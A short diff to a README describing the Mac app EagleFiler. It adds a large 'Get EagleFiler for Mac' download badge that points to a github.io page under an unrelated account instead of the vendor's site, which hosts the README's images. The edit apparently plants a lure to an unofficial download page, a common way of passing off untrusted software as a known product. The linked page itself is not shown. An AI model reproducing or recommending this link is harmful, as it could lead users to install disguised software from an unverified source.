@@ -2,6 +2,12 @@
 
 ![EagleFiler Logo](https://c-command.com/images/eaglefiler-icon-512.png)  
 
+[![📂 Get EagleFiler for Mac](https://img.shields.io/badge/📂_Get_EagleFiler_for_Mac-darkblue?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/eaglefiler)  
+
+---
+
+![EagleFiler Window](https://c-command.com/images/eaglefiler-window.png)  
+
 ---
 
 ## What is EagleFiler?
@@ -26,9 +32,6 @@ Because it works offline and integrates seamlessly with Time Machine, EagleFiler
 
 ---
 
-## Screenshots  
-
-![EagleFiler Window](https://c-command.com/images/eaglefiler-window.png)  
 ![Organized EagleFiler Library](https://c-command.com/images/eaglefiler-library.png)  
 
 ---
